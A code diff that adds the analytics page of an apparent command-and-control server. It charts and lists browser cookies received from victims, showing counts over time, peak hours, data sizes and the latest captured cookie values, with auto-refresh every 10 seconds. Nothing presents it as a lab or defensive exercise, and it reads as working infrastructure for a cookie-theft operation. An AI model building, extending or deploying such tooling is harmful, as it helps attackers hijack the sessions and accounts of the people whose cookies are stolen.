@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>C2 Server - Analytics</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+      rel="stylesheet"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  </head>
+  <body>
+    <div class="dashboard">
+      <!-- Sidebar -->
+      <aside class="sidebar">
+        <div class="sidebar-header">
+          <div class="logo">
+            <i class="fas fa-server"></i>
+            <span>C2 Server</span>
+          </div>
+        </div>
+        <nav class="sidebar-nav">
+          <a href="/" class="nav-item">
+            <i class="fas fa-cookie-bite"></i>
+            <span>Cookies</span>
+          </a>
+          <a href="/analytics.html" class="nav-item active">
+            <i class="fas fa-chart-line"></i>
+            <span>Analytics</span>
+          </a>
+          <a href="#" class="nav-item">
+            <i class="fas fa-cog"></i>
+            <span>Settings</span>
+          </a>
+        </nav>
+        <div class="sidebar-footer">
+          <div class="status-indicator">
+            <span class="status-dot active"></span>
+            <span>Server Online</span>
+          </div>
+        </div>
+      </aside>
+
+      <!-- Main Content -->
+      <main class="main-content">
+        <!-- Header -->
+        <header class="top-header">
+          <div class="header-left">
+            <h1>Analytics Dashboard</h1>
+            <p class="subtitle">Cookie data insights & statistics</p>
+          </div>
+          <div class="header-right">
+            <div class="header-stats">
+              <div class="stat-card">
+                <div class="stat-icon">
+                  <i class="fas fa-database"></i>
+                </div>
+                <div class="stat-info">
+                  <span class="stat-value" id="totalCookies">0</span>
+                  <span class="stat-label">Total Cookies</span>
+                </div>
+              </div>
+              <div class="stat-card">
+                <div class="stat-icon">
+                  <i class="fas fa-chart-line"></i>
+                </div>
+                <div class="stat-info">
+                  <span class="stat-value" id="avgPerHour">0</span>
+                  <span class="stat-label">Avg/Hour</span>
+                </div>
+              </div>
+              <div class="stat-card">
+                <div class="stat-icon">
+                  <i class="fas fa-clock"></i>
+                </div>
+                <div class="stat-info">
+                  <span class="stat-value" id="last24h">0</span>
+                  <span class="stat-label">Last 24h</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </header>
+
+        <!-- Toolbar -->
+        <div class="toolbar">
+          <div class="toolbar-left">
+            <div class="toggle-group">
+              <label class="toggle-label">
+                <input type="checkbox" id="hideDuplicatesAnalytics" />
+                <span class="toggle-slider"></span>
+                <span class="toggle-text">
+                  <i class="fas fa-filter"></i> Hide Duplicates
+                </span>
+              </label>
+            </div>
+          </div>
+          <div class="toolbar-right">
+            <button class="btn btn-secondary" id="refreshAnalyticsBtn">
+              <i class="fas fa-sync-alt"></i> Refresh
+            </button>
+          </div>
+        </div>
+
+        <!-- Analytics Grid -->
+        <div class="analytics-grid">
+          <!-- Chart 1: Timeline -->
+          <div class="chart-card">
+            <div class="chart-header">
+              <h3>
+                <i class="fas fa-chart-area"></i> Cookie Timeline
+              </h3>
+              <div class="chart-controls">
+                <select id="timeRange" class="chart-select">
+                  <option value="24h">Last 24 Hours</option>
+                  <option value="7d">Last 7 Days</option>
+                  <option value="30d">Last 30 Days</option>
+                  <option value="all">All Time</option>
+                </select>
+              </div>
+            </div>
+            <div class="chart-container">
+              <canvas id="timelineChart"></canvas>
+            </div>
+          </div>
+
+          <!-- Chart 2: Hourly Distribution -->
+          <div class="chart-card">
+            <div class="chart-header">
+              <h3>
+                <i class="fas fa-clock"></i> Hourly Distribution
+              </h3>
+            </div>
+            <div class="chart-container">
+              <canvas id="hourlyChart"></canvas>
+            </div>
+          </div>
+
+          <!-- Chart 3: Daily Stats -->
+          <div class="chart-card">
+            <div class="chart-header">
+              <h3>
+                <i class="fas fa-calendar-day"></i> Daily Statistics
+              </h3>
+            </div>
+            <div class="chart-container">
+              <canvas id="dailyChart"></canvas>
+            </div>
+          </div>
+
+          <!-- Chart 4: Data Size Distribution -->
+          <div class="chart-card">
+            <div class="chart-header">
+              <h3>
+                <i class="fas fa-pie-chart"></i> Data Size Distribution
+              </h3>
+            </div>
+            <div class="chart-container">
+              <canvas id="sizeChart"></canvas>
+            </div>
+          </div>
+
+          <!-- Stats Cards -->
+          <div class="stats-grid">
+            <div class="stat-box">
+              <div class="stat-box-icon" style="background: rgba(0, 212, 255, 0.1);">
+                <i class="fas fa-arrow-up" style="color: #00d4ff;"></i>
+              </div>
+              <div class="stat-box-content">
+                <span class="stat-box-value" id="peakHour">--:--</span>
+                <span class="stat-box-label">Peak Hour</span>
+              </div>
+            </div>
+
+            <div class="stat-box">
+              <div class="stat-box-icon" style="background: rgba(0, 255, 136, 0.1);">
+                <i class="fas fa-fire" style="color: #00ff88;"></i>
+              </div>
+              <div class="stat-box-content">
+                <span class="stat-box-value" id="maxPerHour">0</span>
+                <span class="stat-box-label">Max/Hour</span>
+              </div>
+            </div>
+
+            <div class="stat-box">
+              <div class="stat-box-icon" style="background: rgba(255, 71, 87, 0.1);">
+                <i class="fas fa-chart-bar" style="color: #ff4757;"></i>
+              </div>
+              <div class="stat-box-content">
+                <span class="stat-box-value" id="avgSize">0</span>
+                <span class="stat-box-label">Avg Size (bytes)</span>
+              </div>
+            </div>
+
+            <div class="stat-box">
+              <div class="stat-box-icon" style="background: rgba(255, 165, 2, 0.1);">
+                <i class="fas fa-weight" style="color: #ffa502;"></i>
+              </div>
+              <div class="stat-box-content">
+                <span class="stat-box-value" id="totalSize">0 KB</span>
+                <span class="stat-box-label">Total Size</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Activity Log -->
+          <div class="chart-card full-width">
+            <div class="chart-header">
+              <h3>
+                <i class="fas fa-list"></i> Recent Activity
+              </h3>
+              <button class="btn btn-secondary btn-sm" id="refreshAnalytics">
+                <i class="fas fa-sync-alt"></i> Refresh
+              </button>
+            </div>
+            <div class="activity-list" id="activityList">
+              <div class="activity-item">
+                <div class="activity-icon">
+                  <i class="fas fa-info-circle"></i>
+                </div>
+                <div class="activity-content">
+                  <p>Loading activity data...</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Footer Stats -->
+        <footer class="footer-stats">
+          <div class="footer-stat">
+            <span class="footer-label">Last Updated:</span>
+            <span class="footer-value" id="lastUpdate">--:--:--</span>
+          </div>
+          <div class="footer-stat">
+            <span class="footer-label">Data Points:</span>
+            <span class="footer-value" id="dataPoints">0</span>
+          </div>
+          <div class="footer-stat">
+            <span class="footer-label">Auto Refresh:</span>
+            <span class="footer-value">Every 10s</span>
+          </div>
+        </footer>
+      </main>
+    </div>
+
+    <script>
+      let analyticsData = {};
+      let charts = {};
+      let refreshInterval;
+
+      // Chart.js default config
+      Chart.defaults.color = "#b0b3b8";
+      Chart.defaults.borderColor = "#2a3441";
+      Chart.defaults.backgroundColor = "rgba(0, 212, 255, 0.1)";
+
+      // Initialize
+      document.addEventListener("DOMContentLoaded", function () {
+        loadAnalytics();
+        setupEventListeners();
+        startAutoRefresh();
+      });
+
+      // Load analytics data
+      async function loadAnalytics() {
+        try {
+          const response = await fetch("/get-cookies");
+          const cookies = await response.json();
+          analyticsData = processAnalyticsData(cookies);
+          updateCharts();
+          updateStats();
+          updateActivity(cookies);
+        } catch (error) {
+          console.error("Error loading analytics:", error);
+        }
+      }
+
+      // Process analytics data
+      function processAnalyticsData(cookies) {
+        const hideDuplicates = document.getElementById("hideDuplicatesAnalytics")?.checked || false;
+        
+        // Filter duplicates if enabled
+        let processedCookies = cookies;
+        if (hideDuplicates) {
+          const seen = new Set();
+          processedCookies = cookies.filter((cookie) => {
+            if (seen.has(cookie.data)) {
+              return false;
+            }
+            seen.add(cookie.data);
+            return true;
+          });
+        }
+
+        const now = new Date();
+        const data = {
+          timeline: {},
+          hourly: {},
+          daily: {},
+          sizes: { small: 0, medium: 0, large: 0, xlarge: 0 },
+          stats: {
+            total: processedCookies.length,
+            originalTotal: cookies.length,
+            last24h: 0,
+            avgPerHour: 0,
+            maxPerHour: 0,
+            peakHour: null,
+            avgSize: 0,
+            totalSize: 0,
+          },
+        };
+
+        // Process each cookie
+        processedCookies.forEach((cookie) => {
+          const date = new Date(cookie.timestamp);
+          const hour = date.getHours();
+          const day = date.toISOString().split("T")[0];
+          const size = cookie.data ? cookie.data.length : 0;
+
+          // Timeline (by hour)
+          const timelineKey = `${date.toISOString().split("T")[0]} ${String(
+            hour
+          ).padStart(2, "0")}:00`;
+          data.timeline[timelineKey] = (data.timeline[timelineKey] || 0) + 1;
+
+          // Hourly distribution
+          data.hourly[hour] = (data.hourly[hour] || 0) + 1;
+
+          // Daily stats
+          data.daily[day] = (data.daily[day] || 0) + 1;
+
+          // Size distribution
+          if (size < 100) data.sizes.small++;
+          else if (size < 500) data.sizes.medium++;
+          else if (size < 1000) data.sizes.large++;
+          else data.sizes.xlarge++;
+
+          // Last 24h
+          const hoursDiff = (now - date) / (1000 * 60 * 60);
+          if (hoursDiff <= 24) data.stats.last24h++;
+
+          // Size stats
+          data.stats.totalSize += size;
+        });
+
+        // Calculate averages
+        if (processedCookies.length > 0) {
+          const oldest = new Date(processedCookies[0].timestamp);
+          const hoursDiff = (now - oldest) / (1000 * 60 * 60);
+          data.stats.avgPerHour =
+            hoursDiff > 0 ? (processedCookies.length / hoursDiff).toFixed(1) : 0;
+          data.stats.avgSize = Math.round(
+            data.stats.totalSize / processedCookies.length
+          );
+        }
+
+        // Find peak hour
+        let maxCount = 0;
+        Object.keys(data.hourly).forEach((hour) => {
+          if (data.hourly[hour] > maxCount) {
+            maxCount = data.hourly[hour];
+            data.stats.peakHour = `${String(hour).padStart(2, "0")}:00`;
+            data.stats.maxPerHour = maxCount;
+          }
+        });
+
+        return data;
+      }
+
+      // Update charts
+      function updateCharts() {
+        const timeRange = document.getElementById("timeRange").value;
+        updateTimelineChart(timeRange);
+        updateHourlyChart();
+        updateDailyChart();
+        updateSizeChart();
+      }
+
+      // Timeline Chart
+      function updateTimelineChart(range) {
+        const ctx = document.getElementById("timelineChart").getContext("2d");
+        const now = new Date();
+        let labels = [];
+        let data = [];
+
+        // Filter by range
+        Object.keys(analyticsData.timeline)
+          .sort()
+          .forEach((key) => {
+            const keyDate = new Date(key);
+            const daysDiff = (now - keyDate) / (1000 * 60 * 60 * 24);
+
+            if (
+              range === "all" ||
+              (range === "24h" && daysDiff <= 1) ||
+              (range === "7d" && daysDiff <= 7) ||
+              (range === "30d" && daysDiff <= 30)
+            ) {
+              labels.push(key);
+              data.push(analyticsData.timeline[key]);
+            }
+          });
+
+        if (charts.timeline) charts.timeline.destroy();
+
+        charts.timeline = new Chart(ctx, {
+          type: "line",
+          data: {
+            labels: labels,
+            datasets: [
+              {
+                label: "Cookies Received",
+                data: data,
+                borderColor: "#00d4ff",
+                backgroundColor: "rgba(0, 212, 255, 0.1)",
+                tension: 0.4,
+                fill: true,
+              },
+            ],
+          },
+          options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            plugins: {
+              legend: {
+                display: false,
+              },
+            },
+            scales: {
+              y: {
+                beginAtZero: true,
+                grid: {
+                  color: "#2a3441",
+                },
+              },
+              x: {
+                grid: {
+                  color: "#2a3441",
+                },
+              },
+            },
+          },
+        });
+      }
+
+      // Hourly Chart
+      function updateHourlyChart() {
+        const ctx = document.getElementById("hourlyChart").getContext("2d");
+        const labels = Array.from({ length: 24 }, (_, i) =>
+          `${String(i).padStart(2, "0")}:00`
+        );
+        const data = labels.map((_, i) => analyticsData.hourly[i] || 0);
+
+        if (charts.hourly) charts.hourly.destroy();
+
+        charts.hourly = new Chart(ctx, {
+          type: "bar",
+          data: {
+            labels: labels,
+            datasets: [
+              {
+                label: "Cookies",
+                data: data,
+                backgroundColor: "rgba(0, 255, 136, 0.6)",
+                borderColor: "#00ff88",
+                borderWidth: 1,
+              },
+            ],
+          },
+          options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            plugins: {
+              legend: {
+                display: false,
+              },
+            },
+            scales: {
+              y: {
+                beginAtZero: true,
+                grid: {
+                  color: "#2a3441",
+                },
+              },
+              x: {
+                grid: {
+                  display: false,
+                },
+              },
+            },
+          },
+        });
+      }
+
+      // Daily Chart
+      function updateDailyChart() {
+        const ctx = document.getElementById("dailyChart").getContext("2d");
+        const sortedDays = Object.keys(analyticsData.daily).sort();
+        const labels = sortedDays.map((day) =>
+          new Date(day).toLocaleDateString("vi-VN", {
+            month: "short",
+            day: "numeric",
+          })
+        );
+        const data = sortedDays.map((day) => analyticsData.daily[day]);
+
+        if (charts.daily) charts.daily.destroy();
+
+        charts.daily = new Chart(ctx, {
+          type: "bar",
+          data: {
+            labels: labels,
+            datasets: [
+              {
+                label: "Cookies",
+                data: data,
+                backgroundColor: "rgba(255, 71, 87, 0.6)",
+                borderColor: "#ff4757",
+                borderWidth: 1,
+              },
+            ],
+          },
+          options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            plugins: {
+              legend: {
+                display: false,
+              },
+            },
+            scales: {
+              y: {
+                beginAtZero: true,
+                grid: {
+                  color: "#2a3441",
+                },
+              },
+              x: {
+                grid: {
+                  display: false,
+                },
+              },
+            },
+          },
+        });
+      }
+
+      // Size Chart
+      function updateSizeChart() {
+        const ctx = document.getElementById("sizeChart").getContext("2d");
+        const sizes = analyticsData.sizes;
+
+        if (charts.size) charts.size.destroy();
+
+        charts.size = new Chart(ctx, {
+          type: "doughnut",
+          data: {
+            labels: ["< 100B", "100-500B", "500B-1KB", "> 1KB"],
+            datasets: [
+              {
+                data: [
+                  sizes.small,
+                  sizes.medium,
+                  sizes.large,
+                  sizes.xlarge,
+                ],
+                backgroundColor: [
+                  "rgba(0, 212, 255, 0.8)",
+                  "rgba(0, 255, 136, 0.8)",
+                  "rgba(255, 165, 2, 0.8)",
+                  "rgba(255, 71, 87, 0.8)",
+                ],
+                borderColor: [
+                  "#00d4ff",
+                  "#00ff88",
+                  "#ffa502",
+                  "#ff4757",
+                ],
+                borderWidth: 2,
+              },
+            ],
+          },
+          options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            plugins: {
+              legend: {
+                position: "bottom",
+              },
+            },
+          },
+        });
+      }
+
+      // Update statistics
+      function updateStats() {
+        const stats = analyticsData.stats;
+        document.getElementById("totalCookies").textContent = stats.total;
+        document.getElementById("avgPerHour").textContent = stats.avgPerHour;
+        document.getElementById("last24h").textContent = stats.last24h;
+        document.getElementById("peakHour").textContent =
+          stats.peakHour || "--:--";
+        document.getElementById("maxPerHour").textContent = stats.maxPerHour;
+        document.getElementById("avgSize").textContent = stats.avgSize;
+        document.getElementById("totalSize").textContent = formatBytes(
+          stats.totalSize
+        );
+        document.getElementById("dataPoints").textContent = stats.total;
+        document.getElementById("lastUpdate").textContent =
+          new Date().toLocaleTimeString("vi-VN");
+      }
+
+      // Update activity list
+      function updateActivity(cookies) {
+        const activityList = document.getElementById("activityList");
+        const recent = cookies.slice(-10).reverse();
+
+        if (recent.length === 0) {
+          activityList.innerHTML = `
+            <div class="activity-item">
+              <div class="activity-icon">
+                <i class="fas fa-info-circle"></i>
+              </div>
+              <div class="activity-content">
+                <p>No activity yet</p>
+              </div>
+            </div>
+          `;
+          return;
+        }
+
+        activityList.innerHTML = recent
+          .map(
+            (cookie) => `
+          <div class="activity-item">
+            <div class="activity-icon">
+              <i class="fas fa-cookie-bite"></i>
+            </div>
+            <div class="activity-content">
+              <p class="activity-title">Cookie Received</p>
+              <p class="activity-detail">${escapeHtml(
+                cookie.data.substring(0, 60)
+              )}${cookie.data.length > 60 ? "..." : ""}</p>
+              <span class="activity-time">${formatTimestamp(
+                cookie.timestamp
+              )}</span>
+            </div>
+          </div>
+        `
+          )
+          .join("");
+      }
+
+      // Setup event listeners
+      function setupEventListeners() {
+        document
+          .getElementById("timeRange")
+          .addEventListener("change", function () {
+            updateTimelineChart(this.value);
+          });
+
+        const refreshBtn = document.getElementById("refreshAnalyticsBtn") || document.getElementById("refreshAnalytics");
+        if (refreshBtn) {
+          refreshBtn.addEventListener("click", () => {
+            loadAnalytics();
+          });
+        }
+
+        // Hide duplicates toggle
+        const hideDuplicatesToggle = document.getElementById("hideDuplicatesAnalytics");
+        if (hideDuplicatesToggle) {
+          hideDuplicatesToggle.addEventListener("change", function () {
+            loadAnalytics();
+            localStorage.setItem("hideDuplicatesAnalytics", this.checked);
+          });
+
+          // Load saved preference
+          const savedPreference = localStorage.getItem("hideDuplicatesAnalytics");
+          if (savedPreference === "true") {
+            hideDuplicatesToggle.checked = true;
+          }
+        }
+      }
+
+      // Auto refresh
+      function startAutoRefresh() {
+        refreshInterval = setInterval(() => {
+          loadAnalytics();
+        }, 10000); // Refresh every 10 seconds
+      }
+
+      // Format bytes
+      function formatBytes(bytes) {
+        if (bytes === 0) return "0 B";
+        const k = 1024;
+        const sizes = ["B", "KB", "MB", "GB"];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + " " + sizes[i];
+      }
+
+      // Format timestamp
+      function formatTimestamp(timestamp) {
+        const date = new Date(timestamp);
+        return date.toLocaleString("vi-VN", {
+          year: "numeric",
+          month: "2-digit",
+          day: "2-digit",
+          hour: "2-digit",
+          minute: "2-digit",
+          second: "2-digit",
+        });
+      }
+
+      // Escape HTML
+      function escapeHtml(text) {
+        const div = document.createElement("div");
+        div.textContent = text;
+        return div.innerHTML;
+      }
+    </script>
+  </body>
+</html>
+
+
